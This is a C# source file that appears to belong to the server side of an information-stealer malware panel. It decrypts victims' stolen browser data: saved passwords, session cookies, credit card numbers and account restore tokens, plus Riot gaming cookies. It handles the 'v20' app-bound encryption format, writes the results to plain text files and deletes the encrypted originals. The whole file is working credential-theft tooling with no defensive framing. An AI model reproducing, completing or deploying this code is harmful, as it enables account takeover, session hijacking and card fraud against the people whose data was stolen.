using System;
using System.IO;
using System.Text;
using Leb128;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Server.Messages;

internal class DecryptorBrowsers
{
	private const int macBitSize = 128;

	private const int nonceBitSize = 96;

	public static void Start(string log)
	{
		if (Directory.Exists(Path.Combine(log, "Browsers")))
		{
			string[] directories = Directory.GetDirectories(Path.Combine(log, "Browsers"));
			foreach (string text in directories)
			{
				string path = Path.Combine(text, "MasterKey.bin");
				if (File.Exists(path))
				{
					byte[] key = File.ReadAllBytes(path);
					string[] directories2 = Directory.GetDirectories(text);
					foreach (string profile in directories2)
					{
						DecryptPassword(profile, key);
						DecryptCookie(profile, key);
						DecryptCreditCard(profile, key);
						DecryptTokenRestore(profile, key);
					}
					File.Delete(path);
				}
			}
		}
		if (Directory.Exists(Path.Combine(log, "Gaming", "Riot")))
		{
			string path2 = Path.Combine(log, "Gaming", "Riot", "MasterKey.bin");
			if (File.Exists(path2))
			{
				byte[] key2 = File.ReadAllBytes(path2);
				DecryptCookie(Path.Combine(log, "Gaming", "Riot"), key2);
			}
		}
	}

	public static void DecryptPassword(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptPassword.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				if (!string.IsNullOrEmpty((string)array2[0]) && !string.IsNullOrEmpty((string)array2[1]))
				{
					byte[] decrypted = DecryptValue((byte[])array2[2], key);
					if (decrypted != null && decrypted.Length != 0)
					{
						string password = Encoding.UTF8.GetString(decrypted).TrimEnd(default(char));
						File.AppendAllText(Path.Combine(profile, "Password.txt"), "Host: " + (string)array2[0] + "\n" + "Username: " + (string)array2[1] + "\n" + "Password: " + password + "\n\n");
					}
				}
			}
			catch
			{
			}
		}
		File.Delete(path);
	}

	public static void DecryptCookie(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptCookie.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				byte[] decrypted = DecryptValue((byte[])array2[4], key);
				if (decrypted != null && decrypted.Length != 0)
				{
					string value = Encoding.UTF8.GetString(decrypted).TrimEnd(default(char));
					File.AppendAllText(Path.Combine(profile, "Cookie.txt"), (string)array2[0] + "\tTRUE\t" + (string)array2[1] + "\tFALSE\t" + (string)array2[2] + "\t" + (string)array2[3] + "\t" + value + "\r\n");
				}
			}
			catch
			{
			}
		}
		File.Delete(path);
	}

	public static void DecryptCreditCard(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptCreditCard.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				byte[] decrypted = DecryptValue((byte[])array2[0], key);
				if (decrypted != null && decrypted.Length != 0)
				{
					string number = Encoding.UTF8.GetString(decrypted).TrimEnd(default(char));
					File.AppendAllText(Path.Combine(profile, "CreditCard.txt"), "Number: " + number + "\n" + "Exp: " + (string)array2[1] + "/" + (string)array2[2] + "\n" + "Holder: " + (string)array2[3] + "\n\n");
				}
			}
			catch
			{
			}
		}
		File.Delete(path);
	}

	public static void DecryptTokenRestore(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptTokenRestore.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				byte[] decrypted = DecryptValue((byte[])array2[1], key);
				if (decrypted != null && decrypted.Length != 0)
				{
					string token = Encoding.UTF8.GetString(decrypted).TrimEnd(default(char));
					File.AppendAllText(Path.Combine(profile, "TokenRestore.txt"), "AccountId: " + (string)array2[0] + "\n" + "Token: " + token + "\n\n");
				}
			}
			catch
			{
			}
		}
		File.Delete(path);
	}

	public static byte[] DecryptValue(byte[] encryptedData, byte[] bMasterKey)
	{
		if (encryptedData == null || encryptedData.Length < 15 || bMasterKey == null)
		{
			return Array.Empty<byte>();
		}
		try
		{
			using BinaryReader binaryReader = new BinaryReader(new MemoryStream(encryptedData));
			byte[] prefix = binaryReader.ReadBytes(3);
			byte[] nonce;
			byte[] ciphertext;
			if (Encoding.ASCII.GetString(prefix) == "v20")
			{
				binaryReader.ReadBytes(32);
				nonce = binaryReader.ReadBytes(12);
				int remaining = (int)(binaryReader.BaseStream.Length - binaryReader.BaseStream.Position);
				ciphertext = binaryReader.ReadBytes(remaining);
			}
			else
			{
				nonce = binaryReader.ReadBytes(12);
				int remaining2 = (int)(binaryReader.BaseStream.Length - binaryReader.BaseStream.Position);
				ciphertext = binaryReader.ReadBytes(remaining2);
			}
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			AeadParameters parameters = new AeadParameters(new KeyParameter(bMasterKey), 128, nonce);
			gcmBlockCipher.Init(forEncryption: false, parameters);
			byte[] output = new byte[gcmBlockCipher.GetOutputSize(ciphertext.Length)];
			int outOff = gcmBlockCipher.ProcessBytes(ciphertext, 0, ciphertext.Length, output, 0);
			gcmBlockCipher.DoFinal(output, outOff);
			return output;
		}
		catch
		{
			return Array.Empty<byte>();
		}
	}
}
